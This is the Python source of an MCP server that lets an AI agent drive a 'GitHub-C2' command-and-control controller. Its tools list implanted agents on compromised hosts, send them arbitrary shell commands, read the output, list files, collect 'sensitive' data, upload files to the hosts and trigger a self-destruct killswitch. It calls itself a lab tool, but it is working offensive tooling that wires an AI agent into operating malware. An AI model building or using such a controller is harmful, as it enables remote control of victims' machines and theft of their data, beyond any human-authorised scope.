#!/usr/bin/env python3
"""
mcp_server.py — FastMCP server for the GitHub-C2 web controller.

Lets an AI agent operate the C2 through the same HTTP API the browser uses.
Transport: stdio via FastMCP (Content-Length framed JSON-RPC, MCP-compliant).

Configuration — environment variables only (no credentials in files):
    C2_CTRL                controller base URL (default http://127.0.0.1:8080)
    C2_WEB_USER            web login username
    C2_WEB_PASS            web login password
    GITHUB_C2_MCP_TOOLS    toolset filter: handoff | core | full (default handoff)

Toolsets (CyberStrikeAI §6.8 handoff contract):
    handoff — 交接子集（只有 list_agents，先 refresh，返回结构化 JSON）
    core    — handoff + run_command, get_output, sysinfo, stats,
              file_list, audit, tunnel_status
    full    — everything including upload_file, sensitive, killswitch

Run:  python mcp_server.py   (spawned by an MCP client via stdio)
"""
from __future__ import annotations

import json
import os
import time
import urllib.parse
from datetime import datetime
from typing import Any

import requests
from mcp.server.fastmcp import FastMCP

CTRL = os.environ.get("C2_CTRL", "http://127.0.0.1:8080").rstrip("/")
USER = os.environ.get("C2_WEB_USER", "")
PASS = os.environ.get("C2_WEB_PASS", "")
TOOLSET = os.environ.get("GITHUB_C2_MCP_TOOLS", "handoff").strip().lower()
OUTPUT_TRUNC = 12000

_s = requests.Session()

# ── HTTP helpers ──────────────────────────────────────────────────────────────

def _login() -> None:
    r = _s.post(f"{CTRL}/login",
                data={"username": USER, "password": PASS},
                timeout=20, allow_redirects=False)
    if r.status_code not in (302, 303):
        raise RuntimeError(f"login failed: HTTP {r.status_code} — check C2_WEB_USER/C2_WEB_PASS")


def _api(method: str, path: str, ok_key=None, **kw) -> Any:
    """Authenticated controller call with one transparent re-login."""
    for attempt in (1, 2):
        r = _s.request(method, f"{CTRL}{path}", timeout=kw.pop("timeout", 120),
                       allow_redirects=False, **kw)
        if r.status_code == 401:
            _login(); continue
        if r.status_code in (301, 302, 303, 307) and "/login" in r.headers.get("Location", ""):
            _login(); continue
        if r.url.rstrip("/").endswith("/login"):
            _login(); continue
        # Stealth mode: expired session gets 200 + empty body on /api/* paths
        if r.status_code == 200 and path.startswith("/api/") and not r.text.strip():
            _login(); continue
        try:
            data = r.json()
        except ValueError:
            data = {"raw": r.text[:400]}
        if r.status_code >= 400:
            raise RuntimeError(f"HTTP {r.status_code}: {json.dumps(data)[:300]}")
        if ok_key and not data.get(ok_key):
            raise RuntimeError(json.dumps(data)[:300])
        return data
    raise RuntimeError("unauthorized after re-login")


# ── Blocking tool implementations ────────────────────────────────────────────

def _list_agents() -> str:
    """List agents: refresh channels first (picks up brand-new agents),
    then GET. Returns structured JSON for handoff baseline comparison
    (CyberStrikeAI §6.5 requires hostname/username/os/uuid/channel fields)."""
    # Refresh: forces _discover_agents to scan channels for new registrations.
    # Ignore failure (no channels configured yet = 400, still GET the list).
    try:
        _api("POST", "/api/agents/refresh", timeout=30)
    except Exception:
        pass
    body = _api("GET", "/api/agents")
    if isinstance(body, list):
        agents = body
    else:
        agents = (body or {}).get("agents") or []
    if not agents:
        return json.dumps({"agents": [], "note": "No agents registered yet (they auto-appear after first contact)"})
    return json.dumps({
        "agents": [
            {
                "hostname": a.get("hostname", ""),
                "username": a.get("username", ""),
                "os": a.get("os", ""),
                "id": a.get("id", ""),
                "agent_uuid": a.get("agent_uuid", ""),
                "channel": a.get("channel", "github"),
                "channels": a.get("channels") or [a.get("channel", "github")],
                "sibling_ids": a.get("sibling_ids") or [a.get("id", "")],
                "privilege": a.get("privilege", ""),
                "last_seen": a.get("last_seen", ""),
                "last_reply_ago": a.get("last_reply_ago"),
            }
            for a in agents
        ]
    })


def _run_command(agent_id: str, command: str, wait_seconds: int = 180) -> str:
    d = _api("POST", "/api/command", ok_key="command_id",
             json={"agent_id": agent_id, "command": command})
    cmd_id = d["command_id"]
    if wait_seconds <= 0:
        return f"SENT command_id={cmd_id} — use github_c2_get_output(agent_id) to read the reply later."

    # Poll for output up to wait_seconds, matching by response_to (P1-8:
    # prevents returning a previous command's output as this command's result)
    deadline = time.time() + wait_seconds
    while time.time() < deadline:
        time.sleep(min(5, max(2, wait_seconds // 12)))
        msgs = _api("GET", f"/api/messages/{agent_id}")
        items = msgs if isinstance(msgs, list) else msgs.get("messages", [])
        for m in reversed(items):
            if (m.get("is_command") == 0 and m.get("content")
                    and m.get("response_to") == cmd_id):
                content = m["content"]
                if len(content) > OUTPUT_TRUNC:
                    content = content[:OUTPUT_TRUNC] + f"\n... [truncated, {len(m['content'])} bytes total]"
                return content
    # Timeout: return command_id so the caller can check later — do NOT pretend
    # the command wasn't sent.
    return (f"TIMEOUT after {wait_seconds}s — command WAS sent (command_id={cmd_id}). "
            f"Agent poll cycle is ~30s; call github_c2_get_output(agent_id) later.")


def _get_output(agent_id: str, command_id: str = "", tail: int = 0, wait_seconds: int = 30) -> str:
    """Read latest response output, optionally filtered by command_id (P1-8).
    Without command_id, returns the most recent response (legacy behavior)."""
    deadline = time.time() + wait_seconds
    while True:
        msgs = _api("GET", f"/api/messages/{agent_id}")
        items = msgs if isinstance(msgs, list) else msgs.get("messages", [])
        responses = [m for m in items if m.get("is_command") == 0 and m.get("content")]
        if command_id:
            responses = [m for m in responses if m.get("response_to") == command_id]
        if responses:
            content = responses[-1]["content"]
            if tail and len(content) > tail:
                content = content[-tail:]
            if len(content) > OUTPUT_TRUNC:
                content = content[:OUTPUT_TRUNC] + "\n... [truncated]"
            return content
        if time.time() >= deadline:
            return (f"No response for command_id={command_id}" if command_id
                    else "No response output yet.")
        time.sleep(3)


def _sysinfo(agent_id: str, wait_seconds: int = 60) -> str:
    d = _api("POST", "/api/command", ok_key="command_id",
             json={"agent_id": agent_id, "command": "sysinfo"})
    return _get_output(agent_id, command_id=d.get("command_id") or "", wait_seconds=wait_seconds)


def _stats() -> str:
    d = _api("GET", "/api/stats")
    return json.dumps(d, ensure_ascii=False, indent=2)[:OUTPUT_TRUNC]


def _file_list(agent_id: str, path: str = "/", wait_seconds: int = 60) -> str:
    d = _api("POST", "/api/command", ok_key="command_id",
             json={"agent_id": agent_id, "command": f"ls {path}"})
    return _get_output(agent_id, command_id=d.get("command_id") or "", wait_seconds=wait_seconds)


def _audit(limit: int = 20) -> str:
    d = _api("GET", "/api/audit")
    entries = d if isinstance(d, list) else d.get("entries", [])
    lines = [f"- {e.get('timestamp', '?')} | {e.get('action', '?')} | {e.get('detail', '')[:80]}"
             for e in entries[:limit]]
    return "\n".join(lines) or "No audit entries."


def _tunnel_status() -> str:
    d = _api("GET", "/api/tunnel/admin/status")
    return json.dumps(d, ensure_ascii=False, indent=2)[:2000]


def _sensitive(agent_id: str, wait_seconds: int = 120) -> str:
    d = _api("POST", "/api/command", ok_key="command_id",
             json={"agent_id": agent_id, "command": "sensitive"})
    return _get_output(agent_id, command_id=d.get("command_id") or "", wait_seconds=wait_seconds)


def _upload_file(local_path: str, agent_id: str, dest_dir: str = "/tmp",
                 wait_seconds: int = 120) -> str:
    with open(local_path, "rb") as f:
        d = _api("POST", "/api/files/upload", ok_key="ok",
                 data={"agent_id": agent_id, "dest_path": dest_dir},
                 files={"file": f}, timeout=300)
    tid = (d or {}).get("transfer_id") or ""
    posted_at = time.time()
    deadline = posted_at + wait_seconds
    while time.time() < deadline:
        msgs = _api("GET", f"/api/messages/{agent_id}")
        items = msgs if isinstance(msgs, list) else (msgs or {}).get("messages", [])
        for m in reversed(items or []):
            if not isinstance(m, dict):
                continue
            ts = m.get("timestamp") or ""
            try:
                parsed = datetime.fromisoformat(ts.replace("Z", "+00:00")).timestamp() if ts else 0
            except Exception:
                parsed = 0
            if not parsed or parsed + 2 < posted_at:
                continue
            c = m.get("content") or ""
            if tid and tid in c and "[UPLOAD_COMPLETE]" in c:
                return c[:OUTPUT_TRUNC]
            if "[UPLOAD_COMPLETE]" in c:
                return c[:OUTPUT_TRUNC]
            if c.startswith("Error:") and "chunk" in c.lower():
                return c[:OUTPUT_TRUNC]
        time.sleep(3)
    posted = json.dumps(d, ensure_ascii=False)[:400]
    return (f"Upload posted (transfer_id={tid}) but agent did not confirm "
            f"within {wait_seconds}s. {posted}")


def _killswitch(confirm: str) -> str:
    if confirm != "YES-DESTROY-ALL":
        return ("REFUSED. This will make every agent self-destruct on next poll. "
                "Call again with confirm=\"YES-DESTROY-ALL\" to proceed.")
    _api("POST", "/api/killswitch/activate")
    return "Kill signal issued — all agents will self-destruct on next poll."


def _killswitch_deactivate() -> str:
    d = _api("POST", "/api/killswitch/deactivate")
    return json.dumps(d, ensure_ascii=False)[:500]


# ── FastMCP registration ──────────────────────────────────────────────────────

app = FastMCP(
    name="github-c2",
    instructions=(
        "Handoff MCP for GitHub-C2 agents. Use github_c2_list_agents to check "
        "whether a newly delivered agent has registered (implementation refreshes "
        "channels first, returns structured JSON). After confirming registration, "
        "STOP using github_c2_* tools — this is not a working channel. "
        "Payload building and download URLs are done by the human operator."
    ),
)

# handoff tier (only list_agents — refreshes channels, returns JSON for
# hostname/uuid/channel baseline comparison per CyberStrikeAI §6.5)
@app.tool(
    description="List all registered agents as structured JSON (refreshes channels first). "
                "Fields: hostname, username, os, id, agent_uuid, channel, privilege, "
                "last_seen, last_reply_ago. Used for handoff baseline and check-in "
                "verification. Do NOT require last_reply_ago<300 for judging new "
                "registrations — new agents often have null."
)
def github_c2_list_agents() -> str:
    """List all C2 agents with structured fields (refresh first)."""
    return _list_agents()


# core tier (handoff + working tools for authorized use)
if TOOLSET in ("core", "full"):
    @app.tool(
        description="Send a command to an agent. Authorized lab use only. "
                    "Default wait 180s; on timeout returns command_id."
    )
    def github_c2_run_command(agent_id: str, command: str, wait_seconds: int = 180) -> str:
        """Send a command to an agent."""
        return _run_command(agent_id, command, wait_seconds)

    @app.tool(
        description="Read response output from an agent. Pass command_id from "
                    "run_command to avoid picking up a previous command's reply."
    )
    def github_c2_get_output(agent_id: str, command_id: str = "",
                             tail: int = 0, wait_seconds: int = 30) -> str:
        """Get output from an agent, optionally filtered by command_id."""
        return _get_output(agent_id, command_id=command_id, tail=tail,
                           wait_seconds=wait_seconds)

    @app.tool(
        description="Collect system info from an agent."
    )
    def github_c2_sysinfo(agent_id: str, wait_seconds: int = 60) -> str:
        """Collect system info from an agent."""
        return _sysinfo(agent_id, wait_seconds)

    @app.tool(
        description="Controller statistics."
    )
    def github_c2_stats() -> str:
        """Get controller statistics."""
        return _stats()


# core tier
if TOOLSET in ("core", "full"):
    @app.tool(
        description="List files/directories at a path on the agent's host."
    )
    def github_c2_file_list(agent_id: str, path: str = "/", wait_seconds: int = 60) -> str:
        """List files at a path on the agent."""
        return _file_list(agent_id, path, wait_seconds)

    @app.tool(
        description="Query the controller audit log (who did what, when)."
    )
    def github_c2_audit(limit: int = 20) -> str:
        """Query audit log."""
        return _audit(limit)

    @app.tool(
        description="Check SOCKS5 tunnel (Stowaway) status — read-only."
    )
    def github_c2_tunnel_status() -> str:
        """Check tunnel status."""
        return _tunnel_status()


# full tier
if TOOLSET == "full":
    @app.tool(
        description="Upload a file from the controller to an agent's host. Full tier only."
    )
    def github_c2_upload_file(local_path: str, agent_id: str, dest_dir: str = "/tmp",
                              wait_seconds: int = 60) -> str:
        """Upload a file to an agent."""
        return _upload_file(local_path, agent_id, dest_dir, wait_seconds)

    @app.tool(
        description="Collect sensitive file info from an agent (authorized lab use only). "
                    "Full tier only."
    )
    def github_c2_sensitive(agent_id: str, wait_seconds: int = 120) -> str:
        """Collect sensitive information from an agent."""
        return _sensitive(agent_id, wait_seconds)

    @app.tool(
        description="DESTRUCTIVE: make every agent self-destruct on next poll. "
                    "Requires confirm=YES-DESTROY-ALL. Full tier only."
    )
    def github_c2_killswitch(confirm: str) -> str:
        """Kill all agents (destructive, confirm-gated)."""
        return _killswitch(confirm)

    @app.tool(
        description="Deactivate the killswitch alarm (close KILLALL signal). Full tier only."
    )
    def github_c2_killswitch_deactivate() -> str:
        """Deactivate killswitch."""
        return _killswitch_deactivate()


if __name__ == "__main__":
    app.run(transport="stdio")
